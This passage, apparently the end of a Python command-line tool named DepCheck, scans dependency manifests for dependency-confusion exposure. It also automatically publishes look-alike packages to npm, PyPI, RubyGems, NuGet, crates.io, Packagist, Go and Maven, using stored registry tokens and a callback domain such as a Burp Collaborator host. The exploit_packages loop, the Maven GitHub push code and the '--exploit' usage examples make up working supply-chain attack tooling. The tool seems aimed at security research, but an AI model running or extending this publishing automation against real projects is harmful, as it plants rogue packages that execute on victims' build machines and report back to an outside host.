    for rel_path, content in [("pom.xml", pom_xml),
                               (f"src/main/java/{group_path}/{class_name}.java", java_file)]:
        try:
            content_b64 = base64.b64encode(content.encode()).decode()
            try:
                req = Request(f"https://api.github.com/repos/{full_name}/contents/{rel_path}", headers=headers)
                existing = json.loads(urlopen(req, timeout=10).read())
                sha = existing.get("sha", "")
            except HTTPError:
                sha = ""

            put_data = {"message": f"Add {rel_path}", "content": content_b64}
            if sha:
                put_data["sha"] = sha
            req = Request(f"https://api.github.com/repos/{full_name}/contents/{rel_path}",
                           data=json.dumps(put_data).encode(), headers=headers, method="PUT")
            urlopen(req, timeout=15)
        except Exception as e:
            print(f"  {C.R}[-] Failed to push {rel_path}: {e}{C.X}")

    shutil.rmtree(tmpdir, ignore_errors=True)

    print(f"  {C.G}[+] Maven project ready: https://github.com/{full_name}{C.X}")
    print(f"  {C.Y}    Maven Central requires Sonatype OSSRH + GPG signing.")
    print(f"    To publish: configure OSSRH in pom.xml, then `mvn deploy`")
    print(f"    Or use GitHub Packages: `mvn deploy -DaltDeploymentRepository=github::https://maven.pkg.github.com/{full_name}`{C.X}")
    return True


EXPLOITERS = {
    "npm": _exploit_npm,
    "pip": _exploit_pip,
    "rubygems": _exploit_rubygems,
    "nuget": _exploit_nuget,
    "cargo": _exploit_cargo,
    "composer": _exploit_composer,
    "go": _exploit_go,
    "maven": _exploit_maven,
}


def exploit_packages(vulnerable_names, ecosystem, callback, token, author="security-research"):
    """Exploit all vulnerable packages."""
    exploiter = EXPLOITERS.get(ecosystem)
    if not exploiter:
        print(f"\n{C.Y}  [!] Auto-exploit not supported for {ecosystem} yet.")
        print(f"  Supported: {', '.join(EXPLOITERS.keys())}{C.X}\n")
        return 0

    if not callback:
        print(f"{C.R}  [ERROR] --callback required for exploitation (e.g., your.burpcollaborator.net){C.X}")
        return 0

    # Validate callback domain (prevent injection)
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$', callback):
        print(f"{C.R}  [ERROR] Invalid callback domain: {callback}{C.X}")
        return 0

    if not token:
        token_names = {
            "npm": "npm_token", "pip": "pypi_token", "rubygems": "rubygems_token",
            "nuget": "nuget_token", "cargo": "cargo_token",
            "composer": "github_token", "go": "github_token", "maven": "github_token",
        }
        tname = token_names.get(ecosystem, f"{ecosystem}_token")
        print(f"{C.R}  [ERROR] Token required. Save with:")
        print(f"  depcheck.py --save-creds {tname}=<YOUR_TOKEN>{C.X}")
        if ecosystem in ("composer",):
            print(f"  {C.Y}  Also save: --save-creds packagist_token=<TOKEN> (for Packagist submission){C.X}")
        return 0

    print(f"\n{C.R}{C.BD}  ╔══════════════════════════════════════════════╗")
    print(f"  ║  EXPLOITATION MODE — {len(vulnerable_names)} targets ({ecosystem})")
    print(f"  ║  Callback: {callback}")
    print(f"  ╚══════════════════════════════════════════════╝{C.X}\n")

    success = 0
    for i, name in enumerate(sorted(vulnerable_names), 1):
        print(f"  {C.BD}[{i}/{len(vulnerable_names)}]{C.X} {name}")
        if exploiter(name, callback, token, author):
            success += 1
        sleep(2)  # rate limit between publishes

    print(f"\n{'=' * 60}")
    print(f"{C.BD}  EXPLOITATION RESULTS{C.X}")
    print(f"{'=' * 60}")
    print(f"  Published: {C.G}{success}{C.X}")
    print(f"  Failed:    {C.R}{len(vulnerable_names) - success}{C.X}")
    print(f"  Callback:  {callback}")
    print(f"{'=' * 60}\n")

    return success


# ═════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════

def process_file(filepath, args, display_path=None):
    """Process a single dependency file. Returns (has_vulns, packages_count)."""
    display = display_path or filepath

    file_type = args.type or detect_file_type(filepath)

    if file_type == "unknown":
        if not args.quiet:
            print(f"{C.R}  [ERROR] Unknown file type: {display}")
            print(f"  Use --type to specify. Types: {', '.join(sorted(PARSERS.keys()))}{C.X}")
        return False, 0

    if not args.quiet:
        print(f"  {C.CN}File:{C.X}      {display}")
        print(f"  {C.CN}Detected:{C.X}  {file_type}")

    parser_func = PARSERS.get(file_type)
    if not parser_func:
        print(f"{C.R}  [ERROR] No parser for: {file_type}{C.X}")
        return False, 0

    try:
        packages, ecosystem = parser_func(filepath)
    except Exception as e:
        print(f"{C.R}  [ERROR] Parse failed: {e}{C.X}")
        return False, 0

    if not args.quiet:
        print(f"  {C.CN}Ecosystem:{C.X} {ecosystem}")
        print(f"  {C.CN}Packages:{C.X}  {len(packages)}")

    if not packages:
        if not args.quiet:
            print(f"\n{C.Y}  [!] No packages found.{C.X}\n")
        return False, 0

    # List mode
    if args.list:
        for name, version in sorted(packages.items()):
            print(f"  {name} @ {version}")
        print(f"\n  {C.CN}Total: {len(packages)} packages ({ecosystem}){C.X}\n")
        return False, len(packages)

    # Convert mode
    if args.convert:
        output = args.convert_output or f"{os.path.basename(filepath)}-converted.json"
        convert_to_package_json(packages, output)
        return False, len(packages)

    # Scan
    t0 = time()
    results = scan_packages(packages, ecosystem, threads=args.threads, timeout=args.timeout, quiet=args.quiet)
    duration = time() - t0

    has_vulns = print_results(results, packages, ecosystem, display, duration, quiet=args.quiet)

    if args.export:
        export_results(results, packages, ecosystem, display, args.export)

    # Auto-exploit
    if hasattr(args, 'exploit') and args.exploit and results["vulnerable"]:
        TOKEN_MAP = {
            "npm": "npm_token", "pip": "pypi_token", "rubygems": "rubygems_token",
            "nuget": "nuget_token", "cargo": "cargo_token",
            "composer": "github_token", "go": "github_token", "maven": "github_token",
        }
        CLI_TOKEN_MAP = {
            "npm": "npm_token", "pip": "pypi_token", "rubygems": "rubygems_token",
            "nuget": "nuget_token", "cargo": "cargo_token",
            "composer": "github_token", "go": "github_token", "maven": "github_token",
        }
        token_key = TOKEN_MAP.get(ecosystem, f"{ecosystem}_token")
        cli_token = getattr(args, CLI_TOKEN_MAP.get(ecosystem, ""), None)
        token = get_cred(token_key, cli_token)
        callback = getattr(args, "callback", None) or get_cred("callback")
        author = getattr(args, "author", None) or get_cred("author") or "security-research"
        exploit_packages(results["vulnerable"], ecosystem, callback, token, author)

    return has_vulns, len(packages)


def main():
    parser = argparse.ArgumentParser(
        description=f"DepCheck v{VERSION} — Universal Dependency Confusion Scanner & Exploiter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  %(prog)s package.json                      Scan npm manifest
  %(prog)s package-lock.json                 Scan npm lockfile (v1/v2/v3)
  %(prog)s requirements.txt                  Scan Python deps
  %(prog)s --url https://target/pkg.json     Scan from URL
  %(prog)s ./project/                        Scan all dep files in directory
  %(prog)s --convert package-lock.json       Convert for confused tool
  %(prog)s --list pom.xml                    List packages only

Exploitation:
  %(prog)s --exploit --callback y.burp.net --npm-token tok package.json
  %(prog)s --exploit --callback y.oast.fun --pypi-token tok requirements.txt
  %(prog)s --exploit --callback y.burp.net --rubygems-token tok Gemfile
  %(prog)s --exploit --callback y.burp.net --cargo-token tok Cargo.toml
  %(prog)s --exploit --callback y.burp.net --nuget-token tok packages.config
  %(prog)s --exploit --callback y.burp.net --github-token tok composer.json
  %(prog)s --exploit --callback y.burp.net --github-token tok go.mod

Credentials (save once, use forever):
  %(prog)s --save-creds npm_token=xxx pypi_token=yyy callback=y.burp.net
  %(prog)s --save-creds rubygems_token=xxx cargo_token=yyy nuget_token=zzz
  %(prog)s --save-creds github_token=ghp_xxx packagist_token=xxx author=Me
  %(prog)s --show-creds                     Show saved credentials
  %(prog)s --delete-cred npm_token          Delete one credential
  %(prog)s --clear-creds                    Delete all credentials
"""
    )

    # Scan options
    parser.add_argument("target", nargs="?", help="File, directory, or use --url")
    parser.add_argument("--url", "-u", help="Fetch dependency file from URL")
    parser.add_argument("--convert", action="store_true", help="Convert to package.json format")
    parser.add_argument("--convert-output", help="Output path for converted file")
    parser.add_argument("--export", "-e", help="Export results to JSON")
    parser.add_argument("--list", "-l", action="store_true", help="List packages only (no scan)")
    parser.add_argument("--threads", "-t", type=int, default=20, help="Concurrent threads (default: 20)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--type", choices=list(PARSERS.keys()), help="Override file type detection")
    parser.add_argument("--quiet", "-q", action="store_true", help="Only print vulnerable packages")
    parser.add_argument("--no-banner", action="store_true", help="Hide banner")
    parser.add_argument("--version", "-v", action="version", version=f"DepCheck v{VERSION}")
    parser.add_argument("--web", action="store_true", help="Start web UI (browser-based)")
    parser.add_argument("--port", type=int, default=8443, help="Web UI port (default: 8443)")

    # Exploitation
    parser.add_argument("--exploit", action="store_true", help="Auto-exploit vulnerable packages")
    parser.add_argument("--callback", help="Callback domain (burp collaborator, interactsh, etc.)")
    parser.add_argument("--npm-token", dest="npm_token", help="npm access token")
    parser.add_argument("--pypi-token", dest="pypi_token", help="PyPI API token")
    parser.add_argument("--rubygems-token", dest="rubygems_token", help="RubyGems API key")
    parser.add_argument("--nuget-token", dest="nuget_token", help="NuGet API key")
    parser.add_argument("--cargo-token", dest="cargo_token", help="crates.io API token")
    parser.add_argument("--github-token", dest="github_token", help="GitHub token (for Composer/Go/Maven)")
    parser.add_argument("--author", help="Author name for published packages")

    # Credential management
    parser.add_argument("--save-creds", nargs="+", metavar="K=V", help="Save credentials: --save-creds npm_token=xxx pypi_token=yyy callback=z.burp.net")
    parser.add_argument("--show-creds", action="store_true", help="Show saved credentials")
    parser.add_argument("--delete-cred", metavar="KEY", help="Delete a single credential (e.g., --delete-cred npm_token)")
    parser.add_argument("--clear-creds", action="store_true", help="Delete all saved credentials")

    args = parser.parse_args()

    # Web UI mode
    if args.web:
        from web import start_web
        start_web(port=args.port)
        sys.exit(0)

    # Handle credential commands first
    if args.show_creds:
        if not args.no_banner and not args.quiet:
            print(BANNER)
        show_config()
        sys.exit(0)

    if args.clear_creds:
        if os.path.exists(CONFIG_FILE):
            os.unlink(CONFIG_FILE)
            print(f"{C.G}  [+] Credentials cleared.{C.X}")
        else:
            print(f"  {C.Y}No credentials to clear.{C.X}")
        sys.exit(0)

    if args.delete_cred:
        delete_cred(args.delete_cred)
        sys.exit(0)

    if args.save_creds:
        for item in args.save_creds:
            if "=" not in item:
                print(f"{C.R}  [ERROR] Invalid format: '{item}'. Use KEY=VALUE (e.g., npm_token=xxx){C.X}")
                sys.exit(1)
            key, value = item.split("=", 1)
            set_cred(key.strip(), value.strip())
        sys.exit(0)

    if not args.no_banner and not args.quiet:
        print(BANNER)

    # Resolve input
    temp_file = None
    try:
        if args.url:
            temp_file, _ = fetch_url(args.url, quiet=args.quiet)
            filepath = temp_file
            display_path = args.url
        elif args.target:
            filepath = args.target
            display_path = filepath
        else:
            parser.print_help()
            sys.exit(1)

        # Directory scan
        if os.path.isdir(filepath):
            dep_files = find_dep_files(filepath)
            if not dep_files:
                print(f"{C.Y}  [!] No dependency files found in: {filepath}{C.X}")
                sys.exit(0)

            if not args.quiet:
                print(f"  {C.CN}Found {len(dep_files)} dependency file(s) in {filepath}{C.X}\n")

            any_vulns = False
            total_pkgs = 0
            for df in dep_files:
                if not args.quiet:
                    print(f"{'─' * 60}")
                vulns, count = process_file(df, args)
                any_vulns = any_vulns or vulns
                total_pkgs += count

            if not args.quiet and len(dep_files) > 1:
                print(f"{'═' * 60}")
                print(f"  {C.BD}Scanned {len(dep_files)} files, {total_pkgs} total packages{C.X}")
                if any_vulns:
                    print(f"  {C.R}[!] Vulnerabilities found!{C.X}")
                else:
                    print(f"  {C.G}[OK] No dependency confusion found.{C.X}")
                print()

            sys.exit(1 if any_vulns else 0)

        # Single file
        if not os.path.exists(filepath):
            print(f"{C.R}  [ERROR] File not found: {filepath}{C.X}")
            sys.exit(1)

        has_vulns, _ = process_file(filepath, args, display_path=display_path)
        sys.exit(1 if has_vulns else 0)

    finally:
        if temp_file and os.path.exists(temp_file):
            os.unlink(temp_file)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}  [!] Interrupted.{C.X}")
        sys.exit(130)
